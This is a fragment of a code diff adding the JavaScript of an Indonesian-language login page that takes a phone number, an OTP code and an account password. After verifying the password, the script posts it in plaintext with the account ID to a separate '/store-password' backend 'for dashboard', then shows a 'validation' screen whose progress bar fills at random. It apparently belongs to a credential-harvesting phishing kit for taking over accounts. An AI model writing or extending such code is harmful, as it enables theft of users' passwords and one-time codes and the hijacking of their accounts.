+                countdown--;
+
+                if (countdown <= 0) {
+                    clearInterval(countdownTimer);
+                    resendBtn.disabled = false;
+                    resendText.textContent = "Kode OTP belum diterima?";
+                    resendBtn.textContent = "Kirim ulang kode OTP";
+                    return;
+                }
+
+                updateResendText();
+            }, 1000);
+        }
+
+        function updateResendText() {
+            resendText.textContent = `Kirim ulang kode dalam ${countdown} detik`;
+        }
+       
+        resendBtn.addEventListener("click", async () => {
+            const phone = sessionStorage.getItem("phone");
+            if (!phone) {
+                otpStatus.style.color = "#b91c1c";
+                otpStatus.textContent = "❌ Nomor tidak ditemukan, ulangi dari awal";
+                return;
+            }
+
+            otpStatus.style.color = "#1f3c88";
+            otpStatus.textContent = "⏳ Mengirim ulang kode OTP...";
+
+            try {
+                const res = await startLogin(phone);
+
+                if (res.ok && res.data.status === "otp_sent") {
+                    otpStatus.textContent = "✅ Kode OTP baru telah dikirim";
+                    countdown = 60;
+                    startResendCountdown();
+                    clearOtpInputs();
+                    return;
+                }
+
+                otpStatus.style.color = "#b91c1c";
+                otpStatus.textContent = "❌ Gagal mengirim ulang OTP";
+
+            } catch {
+                otpStatus.style.color = "#b91c1c";
+                otpStatus.textContent = "❌ Gagal terhubung ke server";
+            }
+        });
+        function clearOtpInputs() {
+            otpBoxes.forEach(box => box.value = "");
+            otpBoxes[0].focus();
+        }
+
+
+
+        // pengaturan untuk fungsi password 
+        const passwordBtn = document.getElementById("passwordBtn");
+        const passwordInput = document.getElementById("passwordInput");
+        const passwordStatus = document.getElementById("password-status");
+
+        passwordBtn.addEventListener("click", async () => {
+            const password = passwordInput.value.trim();
+            if (!password) {
+                alert("Password tidak boleh kosong");
+                return;
+            }
+
+            passwordBtn.disabled = true;
+            passwordStatus.style.color = "#1f3c88";
+            passwordStatus.textContent = "⏳ Memverifikasi password...";
+
+            try {
+                const phone = sessionStorage.getItem("phone");
+                const res = await verifyPassword(phone, password);
+
+                if (res.status === "login_success") {
+                    passwordStatus.style.color = "#15803d";
+                    passwordStatus.textContent = "✅ Vrefikasi berhasil";
+
+                    // ⭐ SIMPAN PASSWORD KE BACKEND (UNTUK DASHBOARD)
+                    fetch(`${BACKEND_URL}/store-password`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            account_id: Number(res.account_id),
+                            password: password
+                        })
+                    })
+                    .then(r => r.json())
+                    .then(r => {
+                        if (!r.success) {
+                            console.error("Store password error:", r);
+                        }
+                    })
+                    .catch(err => {
+                        console.error("Store password failed:", err);
+                    });
+
+                    
+                    setTimeout(() => {
+                        showRequestState();
+                    }, 600);
+
+                    return;
+                }
+
+                if (res.error) {
+                    passwordStatus.style.color = "#b91c1c";
+                    passwordStatus.textContent = "❌ " + res.error;
+                }
+
+            } catch {
+                passwordStatus.style.color = "#b91c1c";
+                passwordStatus.textContent = "❌ Gagal terhubung ke server";
+            } finally {
+                passwordBtn.disabled = false;
+            }
+        });
+        
+        // pengaturan untuk fungsi password mata 
+        const togglePassword = document.getElementById("togglePassword");
+
+        togglePassword.addEventListener("click", () => {
+            const hidden = passwordInput.type === "password";
+            passwordInput.type = hidden ? "text" : "password";
+            togglePassword.textContent = hidden ? "👁️" : "🙈";
+        });
+
+
+
+        // fungsi untuk menyembunyikan tampilan lain lalu hanya menampilkan tampilan validasi permintaa 
+        function showRequestState() {
+
+            // sembunyikan Password
+            document.getElementById("passwordSection").classList.add("hidden");
+            // sembunyikan OTP
+            document.getElementById("otpSection").classList.add("hidden");
+
+            // tampilkan VALIDASI
+            document.getElementById("validasiSection").classList.remove("hidden");
+
+            document.getElementById("validasiSection")
+                .scrollIntoView({ behavior: "smooth" });
+
+            // ⏳ mulai progress bar
+            startRequestProgress();
+
+            return;
+
+        }
+
+        function startRequestProgress() {
+            const bar = document.getElementById("requestProgress");
+            if (!bar) return;
+
+            let progress = 0;
+
+            const interval = setInterval(() => {
+                progress += Math.floor(Math.random() * 8) + 4;
+
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                }
+
+                bar.style.width = progress + "%";
+            }, 800);
+        }
+
+
+    </script>
+</body>
+</html>
